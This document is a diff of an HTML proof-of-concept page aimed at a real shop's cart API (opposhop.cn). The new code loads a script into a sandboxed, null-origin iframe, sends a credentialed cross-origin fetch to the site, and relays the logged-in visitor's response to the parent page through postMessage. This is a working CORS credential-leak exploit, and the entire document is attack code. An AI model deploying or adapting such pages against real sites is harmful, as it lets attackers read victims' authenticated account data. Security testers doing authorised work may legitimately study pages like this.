@@ -2,32 +2,40 @@
 <html>
 <body>
 
-<button onclick="test()">Run</button>
+<button onclick="run()">Run Test</button>
 
-<pre id="out"></pre>
+<pre id="result"></pre>
+
+<iframe id="frame" sandbox="allow-scripts" style="display:none"></iframe>
 
 <script>
 
-function test(){
+function run(){
+
+const code = `
+<script>
 
 fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
-method:"GET",
-credentials:"include",
-headers:{
-"Content-Type":"text/plain"
-},
-body:"test"
+credentials:"include"
 })
-
 .then(r=>r.text())
 .then(t=>{
-document.getElementById("out").textContent=t
+parent.postMessage(t,"*")
 })
 .catch(e=>{
-document.getElementById("out").textContent=e
+parent.postMessage("ERROR: "+e,"*")
 })
 
+<\/script>
+`;
+
+document.getElementById("frame").srcdoc = code;
+
 }
+
+window.addEventListener("message",function(e){
+document.getElementById("result").textContent = e.data;
+});
 
 </script>
 
